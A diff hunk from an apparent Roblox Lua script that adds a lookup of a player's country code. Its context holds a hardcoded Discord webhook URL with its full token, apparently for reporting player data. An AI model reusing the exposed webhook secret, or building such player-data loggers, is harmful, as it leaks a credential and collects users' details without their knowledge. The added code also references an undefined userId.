@@ -2,7 +2,15 @@ local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local Players = game:GetService("Players")
+local country = "Unknown"
 
+pcall(function()
+    local res = HttpService:GetAsync("https://users.roblox.com/v1/users/" .. userId)
+    local data = HttpService:JSONDecode(res)
+    if data and data.countryCode then
+        country = data.countryCode
+    end
+end)
 local LocalPlayer = Players.LocalPlayer
 local WebhookURL = "https://discord.com/api/webhooks/1464923263443402886/AMqNuy3ujxdQalbS9-bf6aRpanpJqMoWIFKtpM1JOPWCMspDsb_135CPca1UsLg0bYlg"
 
